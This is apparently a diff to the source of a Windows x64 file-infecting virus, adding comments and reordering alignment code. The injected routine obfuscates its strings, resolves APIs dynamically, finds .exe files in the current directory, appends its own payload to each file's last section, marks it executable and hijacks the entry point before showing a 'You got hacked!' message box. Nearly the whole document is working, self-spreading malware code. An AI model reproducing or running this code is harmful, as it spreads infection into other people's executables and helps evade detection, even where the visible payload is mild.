@@ -10,15 +10,17 @@ extern CONST LONGLONG delta_start;
 extern CONST DWORD code_size;
 #ifndef SKIP_SIGN
 extern CONST DWORD signature;
-#endif
+#endif  // SKIP_SIGN
 EXTERN_C_END
 
 __declspec(code_seg("injected")) VOID inj_code_c() {
-    DECLARE_OBFUSCATED(user32, "USER32.DLL");
-    DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");
-    DECLARE_OBFUSCATED(mbText, "You got hacked!");
-    DECLARE_OBFUSCATED(exeExt, "*.exe");
+    // Declare obfuscated strings for the rest of the function
+    DECLARE_OBFUSCATED(user32, "USER32.DLL");       // DLL to load for MessageBoxA
+    DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");       // MessageBoxA title
+    DECLARE_OBFUSCATED(mbText, "You got hacked!");  // MessageBoxA text
+    DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
 #ifdef PL_DEBUG
+    // Declarations for debug strings
     DECLARE_OBFUSCATED(mbInjecting, "Injecting...");
     // DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
     // DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
@@ -26,8 +28,10 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     // DECLARE_OBFUSCATED(errOpenFile, "Error opening file");
     // DECLARE_OBFUSCATED(errMapFile, "Error mapping file");
     // DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
-#endif
+#endif  // PL_DEBUG
 
+    // Get module handles and function pointers
+    /* */
     CONST auto pKernel32Dll = GET_DLL(kernel32.dll);
     CONST auto pLoadLibraryA = GET_FUNC(pKernel32Dll, LoadLibraryA);
     CONST auto pGetModuleFileNameA = GET_FUNC(pKernel32Dll, GetModuleFileNameA);
@@ -45,11 +49,12 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
+    /* */
 
-    LPSTR sDirEnd;
-    HANDLE hFind;
+    LPSTR sDirEnd;  // Pointer to the end of the directory path in `sFilePath`, after the final '\\'
+    HANDLE hFind;   // Handle for the file search
 
-    CHAR sModuleName[MAX_PATH];
+    CHAR sModuleName[MAX_PATH];  // Buffer for the module name
     DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
     if (res == 0 || res >= sizeof(sModuleName)) {
         // MSGBOX_DBG(DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
@@ -57,22 +62,23 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     }
     // MSGBOX_DBG(sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
 
-    CHAR sDirName[MAX_PATH];
-    CHAR sFindPath[MAX_PATH];
+    CHAR sDirName[MAX_PATH];   // Buffer for the directory name
+    CHAR sFindPath[MAX_PATH];  // Buffer for the search path
     res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
     if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
         // MSGBOX_DBG(DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
         goto end;
     }
+    // Append a backslash to the current directory name
     my_strappend(sDirName, '\\');
+    // Set the search path to "$PWD\*.exe"
     my_strcpy(sFindPath, sDirName);
     my_strcat(sFindPath, DEOBF(exeExt));
-    // MSGBOX_DBG(sFindPath, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
 
-    CHAR sFilePath[MAX_PATH];
+    CHAR sFilePath[MAX_PATH];  // Buffer for the full file path
     sDirEnd = my_strcpy(sFilePath, sDirName) - 1;
 
-    WIN32_FIND_DATAA findData;
+    WIN32_FIND_DATAA findData;  // Structure to hold file search results
     hFind = pFindFirstFileA(sFindPath, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
         MSGBOX_DBG(DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
@@ -84,24 +90,26 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     DWORD dwFileSize, dwFileAlignment, dwNewFileSize, dwSizeAligned;
 #ifndef SKIP_SIGN
     DWORD dwSignature;
-#endif
+#endif  // SKIP_SIGN
     PCIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwLastSectionEnd, dwOrigEntryPoint;
-    WORD wNbSectionsMin1;
+    WORD wNbSectionsMin1;  // Number of sections minus 1 (for array indexing)
     PBYTE pPayloadData;
 
     do {
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // Skip directories
             continue;
         }
 
+        // Construct the full file path by appending the file name to the directory path
         my_strcpy(sDirEnd, findData.cFileName);
-        if (!my_stricmp(sFilePath, sModuleName)
+        if (!my_stricmp(sFilePath, sModuleName)  // Skip the current module
 #ifdef NEED_BANG
-            || sDirEnd[0] != '!'
-#endif
+            || sDirEnd[0] != '!'  // Skip file names not starting with '!' if `NEED_BANG` is defined
+#endif                            // NEED_BANG
         ) {
             MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONWARNING);
             continue;
@@ -116,6 +124,9 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         }
 
         dwFileSize = pGetFileSize(hFile, NULL);
+
+        // First, map the file in read-only mode to check if it's a valid PE file, and get some
+        // information about it (eg. alignment, to remap it in read-write mode later on)
 
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, dwFileSize, NULL);
         if (hMapFile == NULL) {
@@ -150,10 +161,10 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         dwLastSectionRva = pLastSection->VirtualAddress;
         dwLastSectionEnd = dwLastSectionRva + dwLastSectionSize;
         dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
-        dwSizeAligned = ALIGN(code_size, dwFileAlignment);
-        dwNewFileSize = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);
 
 #ifndef SKIP_SIGN
+        // Check if the payload is already injected by looking for the signature
+        // right before the entry point, if it's inside the last section
         if (dwOrigEntryPoint >= dwLastSectionRva && dwOrigEntryPoint < dwLastSectionEnd) {
             dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
                                      (dwOrigEntryPoint - dwLastSectionRva) -
@@ -162,11 +173,22 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
                 goto error;
             }
         }
-#endif
+#endif  // SKIP_SIGN
 
+        // All checks passed, the file seems to be a valid PE x64 executable
+        // Let's inject the payload into the last section
+
+        // Unmap the file to remap it in read-write mode
         pUnmapViewOfFile(pMapAddress);
         pCloseHandle(hMapFile);
 
+        // Section raw data must be aligned to FileAlignment
+        // Since the original section is assumed to be aligned, we just need to align the payload
+        dwSizeAligned = ALIGN(code_size, dwFileAlignment);
+        // Make sure the final file size is aligned
+        dwNewFileSize = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);
+
+        // Remap the file in read-write mode to inject the payload and update the headers
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
         if (hMapFile == NULL) {
             // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
@@ -197,17 +219,22 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
         pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
         pLastSection->SizeOfRawData += dwSizeAligned;
+        // If the last section is already code, only add the new payload size to SizeOfCode
+        // Otherwise, add the whole section size since we're going to mark it as code anyway
         pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
                                                     ? dwSizeAligned
                                                     : pLastSection->SizeOfRawData;
+        // SizeOfImage must be aligned to SectionAlignment
         pNtHeader->OptionalHeader.SizeOfImage =
             ALIGN(dwLastSectionRva + pLastSection->Misc.VirtualSize,
                   pNtHeader->OptionalHeader.SectionAlignment);
+        // Make the last section executable, and mark it as code and not discardable
         pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
         pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
         pNtHeader->OptionalHeader.AddressOfEntryPoint =
             dwLastSectionEnd + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
+        // Inject the payload and update the entry point delta
         my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
         *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
             (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
@@ -227,6 +254,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     pFindClose(hFind);
 
 end:
+    // Actual malicious payload: display a message box
     pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle),
                  MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
 }
